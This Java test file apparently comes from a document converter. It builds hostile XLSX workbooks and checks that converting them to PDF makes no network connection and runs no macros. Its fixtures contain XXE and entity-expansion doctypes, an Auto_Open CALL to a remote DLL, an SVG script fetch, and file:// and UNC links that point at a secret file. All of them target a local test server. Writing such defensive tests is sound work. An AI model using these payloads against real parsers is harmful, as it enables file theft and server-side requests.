package stirling.software.officeconvert.topdf.xlsx;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.awt.Color;
import java.nio.file.Path;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import stirling.software.officeconvert.topdf.testing.Fixtures;
import stirling.software.officeconvert.topdf.testing.HostileImagePlugin;
import stirling.software.officeconvert.topdf.testing.NoNetwork;

class XlsxNoNetworkTest {

    private static final String MAIN = "http://schemas.openxmlformats.org/spreadsheetml/2006/main";

    private static final String R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";

    private static final String XDR = "http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing";

    private static final String A = "http://schemas.openxmlformats.org/drawingml/2006/main";

    @TempDir
    Path dir;

    @Test
    void formulasThatWouldReachOutShowOnlyTheirCachedValues() throws Exception {
        try (NoNetwork net = NoNetwork.start()) {
            XlsxTesting.Converted out = XlsxTesting.convert(dir, "hostile.xlsx", Fixtures.hostileXlsx(net));
            String text = out.all();
            for (String cached : new String[] {"Hostile", "CACHED-WEB", "42", "go", "CACHED-RTD"}) {
                assertTrue(text.contains(cached), cached + " in " + text);
            }
            assertFalse(text.contains("WEBSERVICE") || text.contains("RTD("), text);
            String warnings = String.join("\n", out.result().warnings());
            assertTrue(warnings.contains("macro"), warnings);
            net.assertNothingConnected();
        }
    }

    @Test
    void linkedPicturesObjectsControlsAndChartsAreNeverLoaded() throws Exception {
        try (NoNetwork net = NoNetwork.start(); HostileImagePlugin plugin = HostileImagePlugin.register()) {
            XlsxTesting.Converted out = XlsxTesting.convert(dir, "drawing.xlsx", hostileDrawing(net));
            assertEquals(1, out.pages().size());
            assertTrue(out.all().contains("Drawing sheet"), out.all());
            assertTrue(out.all().contains("CACHEDEXT"), out.all());
            assertEquals(1, out.images(), "only the embedded PNG fallback is drawn");
            plugin.assertNeverUsed();
            net.assertNothingConnected();
        }
    }

    @Test
    void macroEnabledWorkbooksAreRenderedWithoutRunningAnything() throws Exception {
        try (NoNetwork net = NoNetwork.start()) {
            Fixtures.Zip z = Fixtures.edit(Fixtures.xlsx(new String[][] {{"Macro book", "value"}}));
            String types = z.text("[Content_Types].xml").replace(
                    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
                    "application/vnd.ms-excel.sheet.macroEnabled.main+xml");
            z.put("[Content_Types].xml", types);
            z.put("xl/vbaProject.bin", new byte[] {(byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0, 0, 0, 0, 0});
            z.override("/xl/vbaProject.bin", "application/vnd.ms-office.vbaProject");
            z.relationship("/xl/workbook.xml", "rIdVba", Fixtures.MS_REL + "vbaProject", "vbaProject.bin", false);
            z.insertAfter("xl/workbook.xml", "</sheets>", "<definedNames><definedName name=\"Auto_Open\">"
                    + "CALL(\"" + net.url("dll") + "\")</definedName></definedNames>");
            XlsxTesting.Converted out = XlsxTesting.convert(dir, "macro.xlsm", z.bytes());
            assertTrue(out.all().contains("Macro book"), out.all());
            net.assertNothingConnected();
        }
    }

    @Test
    void doctypesAndEntitiesInWorkbookPartsAreRefused() throws Exception {
        try (NoNetwork net = NoNetwork.start()) {
            String doctype = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE x SYSTEM \"" + net.url("evil.dtd")
                    + "\" [<!ENTITY xxe SYSTEM \"" + net.url("xxe") + "\"><!ENTITY a \"aaaaaaaaaa\"><!ENTITY b \"&a;&a;&a;"
                    + "&a;&a;&a;&a;&a;\">]>";
            Fixtures.Zip z = Fixtures.edit(Fixtures.xlsx(new String[][] {{"kept"}}));
            z.put("xl/worksheets/sheet1.xml", doctype + "<worksheet xmlns=\"" + MAIN + "\"><sheetData><row r=\"1\">"
                    + "<c r=\"A1\" t=\"inlineStr\"><is><t>&xxe;&b;</t></is></c></row></sheetData></worksheet>");
            if (z.has("xl/sharedStrings.xml")) {
                String sst = z.text("xl/sharedStrings.xml").replaceFirst("^<\\?xml[^>]*\\?>", "");
                z.put("xl/sharedStrings.xml", doctype + sst);
            }
            XlsxTesting.Converted out = XlsxTesting.convert(dir, "doctype.xlsx", z.bytes());
            assertEquals(1, out.pages().size());
            assertFalse(out.all().contains("aaaa"), out.all());
            net.assertNothingConnected();
        }
    }

    static byte[] hostileDrawing(NoNetwork net) {
        Fixtures.Zip z = Fixtures.edit(Fixtures.xlsx(new String[][] {{"Drawing sheet"}}));
        String sheet = "xl/worksheets/sheet1.xml";
        String body = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><worksheet xmlns=\"" + MAIN
                + "\" xmlns:r=\"" + R + "\"><sheetData><row r=\"1\"><c r=\"A1\" t=\"inlineStr\"><is><t>Drawing sheet"
                + "</t></is></c><c r=\"B1\" t=\"str\"><f>[1]Sheet1!A1</f><v>CACHEDEXT</v></c></row></sheetData>"
                + "<hyperlinks><hyperlink ref=\"A1\" r:id=\"rIdFileLink\"/></hyperlinks>"
                + "<pageSetup orientation=\"portrait\"/>"
                + "<headerFooter><oddHeader>&amp;L&amp;G</oddHeader></headerFooter>"
                + "<drawing r:id=\"rIdDrawing\"/><legacyDrawingHF r:id=\"rIdHf\"/>"
                + "<oleObjects><oleObject progId=\"Excel.Sheet.12\" shapeId=\"1025\" r:id=\"rIdOle\">"
                + "<objectPr defaultSize=\"0\" r:id=\"rIdPreview\"><anchor moveWithCells=\"1\"><from><xdr:col"
                + " xmlns:xdr=\"" + XDR + "\">2</xdr:col><xdr:colOff xmlns:xdr=\"" + XDR + "\">0</xdr:colOff>"
                + "<xdr:row xmlns:xdr=\"" + XDR + "\">2</xdr:row><xdr:rowOff xmlns:xdr=\"" + XDR + "\">0</xdr:rowOff>"
                + "</from><to><xdr:col xmlns:xdr=\"" + XDR + "\">4</xdr:col><xdr:colOff xmlns:xdr=\"" + XDR
                + "\">0</xdr:colOff><xdr:row xmlns:xdr=\"" + XDR + "\">5</xdr:row><xdr:rowOff xmlns:xdr=\"" + XDR
                + "\">0</xdr:rowOff></to></anchor></objectPr></oleObject></oleObjects>"
                + "<controls><control shapeId=\"1026\" r:id=\"rIdAx\" name=\"Browser\"/></controls></worksheet>";
        z.put(sheet, body);
        z.relationship("/" + sheet, "rIdFileLink", Fixtures.REL + "hyperlink", net.fileUrl("secret.txt"), true);
        z.relationship("/" + sheet, "rIdOle", Fixtures.REL + "oleObject", net.uncPath("embedded.xlsx"), true);
        z.relationship("/" + sheet, "rIdPreview", Fixtures.REL + "image", net.url("preview.emf"), true);
        z.put("xl/activeX/activeX1.xml", "<ax:ocx xmlns:ax=\"http://schemas.microsoft.com/office/2006/activeX\""
                + " ax:classid=\"{8856F961-340A-11D0-A96B-00C04FD705A2}\"><ax:ocxPr ax:name=\"Location\" ax:value=\""
                + net.url("activex") + "\"/></ax:ocx>");
        z.override("/xl/activeX/activeX1.xml", "application/vnd.ms-office.activeX+xml");
        z.relationship("/" + sheet, "rIdAx", Fixtures.REL + "control", "../activeX/activeX1.xml", false);
        z.put("xl/drawings/vmlDrawing1.vml", "<xml xmlns:v=\"urn:schemas-microsoft-com:vml\" xmlns:o="
                + "\"urn:schemas-microsoft-com:office:office\"><v:shape id=\"LH\" style=\"width:20pt;height:20pt\">"
                + "<v:imagedata o:relid=\"rIdHfImg\" o:title=\"logo\"/></v:shape></xml>");
        z.defaultType("vml", "application/vnd.openxmlformats-officedocument.vmlDrawing");
        z.relationship("/" + sheet, "rIdHf", Fixtures.REL + "vmlDrawing", "../drawings/vmlDrawing1.vml", false);
        z.relationship("/xl/drawings/vmlDrawing1.vml", "rIdHfImg", Fixtures.REL + "image", net.url("logo.png"), true);
        z.put("xl/externalLinks/externalLink1.xml", "<externalLink xmlns=\"" + MAIN + "\" xmlns:r=\"" + R + "\">"
                + "<externalBook r:id=\"rId1\"><sheetNames><sheetName val=\"Sheet1\"/></sheetNames></externalBook>"
                + "</externalLink>");
        z.override("/xl/externalLinks/externalLink1.xml",
                "application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml");
        z.relationship("/xl/externalLinks/externalLink1.xml", "rId1", Fixtures.REL + "externalLinkPath",
                net.url("book.xlsx"), true);
        z.relationship("/xl/workbook.xml", "rIdExt1", Fixtures.REL + "externalLink", "externalLinks/externalLink1.xml",
                false);
        z.insertAfter("xl/workbook.xml", "</sheets>", "<externalReferences><externalReference xmlns:r=\"" + R
                + "\" r:id=\"rIdExt1\"/></externalReferences>");
        z.put("xl/media/fallback.png", Fixtures.png(8, 8, Color.RED));
        z.defaultType("png", "image/png");
        z.put("xl/media/vector.svg", "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/"
                + "xlink\" width=\"8\" height=\"8\"><image xlink:href=\"" + net.url("svg.png") + "\" width=\"8\""
                + " height=\"8\"/><script>fetch('" + net.url("svg-script") + "')</script></svg>");
        z.defaultType("svg", "image/svg+xml");
        z.put("xl/charts/chart1.xml", "<c:chartSpace xmlns:c=\"http://schemas.openxmlformats.org/drawingml/2006/chart\""
                + " xmlns:r=\"" + R + "\"><c:chart/><c:externalData r:id=\"rIdData\"><c:autoUpdate val=\"1\"/>"
                + "</c:externalData></c:chartSpace>");
        z.override("/xl/charts/chart1.xml", "application/vnd.openxmlformats-officedocument.drawingml.chart+xml");
        z.relationship("/xl/charts/chart1.xml", "rIdData", Fixtures.REL + "oleObject", net.url("data.xlsx"), true);
        String drawing = "xl/drawings/drawing1.xml";
        z.put(drawing, "<xdr:wsDr xmlns:xdr=\"" + XDR + "\" xmlns:a=\"" + A + "\" xmlns:r=\"" + R + "\">"
                + anchor(0, pic("r:link=\"rIdLinked\"", ""))
                + anchor(2, pic("r:embed=\"rIdExternalEmbed\"", ""))
                + anchor(4, pic("r:embed=\"rIdPng\"", "<a:extLst><a:ext uri=\"{96DAC541-7B7A-43D3-8B79-37D633B846F1}\">"
                        + "<asvg:svgBlip xmlns:asvg=\"http://schemas.microsoft.com/office/drawing/2016/SVG/main\""
                        + " r:embed=\"rIdSvg\"/></a:ext></a:extLst>"))
                + anchor(6, "<xdr:sp><xdr:nvSpPr><xdr:cNvPr id=\"9\" name=\"Link\"><a:hlinkClick r:id=\"rIdShapeLink\"/>"
                        + "</xdr:cNvPr><xdr:cNvSpPr/></xdr:nvSpPr><xdr:spPr><a:prstGeom prst=\"rect\"><a:avLst/>"
                        + "</a:prstGeom><a:solidFill><a:srgbClr val=\"DDEEFF\"/></a:solidFill></xdr:spPr>"
                        + "<xdr:txBody><a:bodyPr/><a:p><a:r><a:t>shape text</a:t></a:r></a:p></xdr:txBody></xdr:sp>")
                + anchor(8, "<xdr:graphicFrame><xdr:nvGraphicFramePr><xdr:cNvPr id=\"10\" name=\"Chart\"/>"
                        + "<xdr:cNvGraphicFramePr/></xdr:nvGraphicFramePr><xdr:xfrm/><a:graphic><a:graphicData"
                        + " uri=\"http://schemas.openxmlformats.org/drawingml/2006/chart\"><c:chart xmlns:c="
                        + "\"http://schemas.openxmlformats.org/drawingml/2006/chart\" r:id=\"rIdChart\"/>"
                        + "</a:graphicData></a:graphic></xdr:graphicFrame>")
                + "</xdr:wsDr>");
        z.override("/" + drawing, "application/vnd.openxmlformats-officedocument.drawing+xml");
        z.relationship("/" + sheet, "rIdDrawing", Fixtures.REL + "drawing", "../drawings/drawing1.xml", false);
        z.relationship("/" + drawing, "rIdLinked", Fixtures.REL + "image", net.url("linked.png"), true);
        z.relationship("/" + drawing, "rIdExternalEmbed", Fixtures.REL + "image", net.canaryUrl("embed.png"), true);
        z.relationship("/" + drawing, "rIdPng", Fixtures.REL + "image", "../media/fallback.png", false);
        z.relationship("/" + drawing, "rIdSvg", Fixtures.MS_REL_2007 + "image", "../media/vector.svg", false);
        z.relationship("/" + drawing, "rIdShapeLink", Fixtures.REL + "hyperlink", net.uncPath("share"), true);
        z.relationship("/" + drawing, "rIdChart", Fixtures.REL + "chart", "../charts/chart1.xml", false);
        return z.bytes();
    }

    private static String anchor(int row, String object) {
        return "<xdr:twoCellAnchor><xdr:from><xdr:col>1</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>" + row
                + "</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:from><xdr:to><xdr:col>3</xdr:col><xdr:colOff>0"
                + "</xdr:colOff><xdr:row>" + (row + 2) + "</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:to>" + object
                + "<xdr:clientData/></xdr:twoCellAnchor>";
    }

    private static String pic(String blip, String ext) {
        return "<xdr:pic><xdr:nvPicPr><xdr:cNvPr id=\"2\" name=\"Picture\"/><xdr:cNvPicPr/></xdr:nvPicPr>"
                + "<xdr:blipFill><a:blip " + blip + ">" + ext + "</a:blip><a:stretch><a:fillRect/></a:stretch>"
                + "</xdr:blipFill><xdr:spPr><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom></xdr:spPr></xdr:pic>";
    }
}
